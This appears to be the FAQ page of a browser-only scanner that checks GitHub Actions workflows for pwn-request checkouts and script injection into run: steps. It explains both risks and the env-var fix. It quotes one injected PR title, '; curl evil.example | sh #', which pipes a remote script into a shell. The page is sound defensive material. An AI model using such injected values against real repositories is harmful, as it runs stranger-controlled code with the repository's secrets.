Is your GitHub Actions workflow open to a pwn request or script injection?

Common questions

What is a "pwn request" in GitHub Actions?

A workflow triggered by pull_request_target or workflow_run runs with the base repository's secrets and a privileged GITHUB_TOKEN, even though the event itself was raised by a stranger's fork. If a step in that workflow checks out the untrusted head (for example ref: ${{ github.event.pull_request.head.sha }}) and a later step builds, tests, or otherwise executes that code, the fork's code runs with your secrets. GitHub's own security guidance documents this at length, and actions/checkout v7 (June 2026) started refusing the common form of it by default.

What is script injection in a run: step?

When a run: step interpolates ${{ github.event.pull_request.title }} (or another untrusted context value) directly into a shell command, the value is spliced into the script text before the shell ever sees it as data — not passed as a string. Since a PR title, issue body, or branch name is content a stranger fully controls, a title like "; curl evil.example | sh #" runs as a second command. GitHub's guidance names the fix: pass the value through a step env: var and reference it as a quoted shell variable instead.

Does this tool fetch anything from GitHub for me?

No. It makes no network calls at all — nothing here can, because nothing here talks to a server. Paste your workflow YAML and the scan runs entirely in this page.

Does a clean scan mean my workflows are secure?

No. This checks two specific, well-documented patterns. It is not a security audit and makes no claim about your workflows' overall security. Both patterns have variants this tool does not attempt to catch — a hand-rolled git checkout instead of actions/checkout, or an expression built in an unusual way.

Why does script injection get flagged regardless of trigger type?

Unlike the pwn-request checkout risk, script injection into a shell is dangerous on any trigger a stranger can influence — pull_request, issues, issue_comment — not just the two privileged triggers. A workflow token with even minimal permissions, or a runner with network access, is enough for an injected command to do damage.
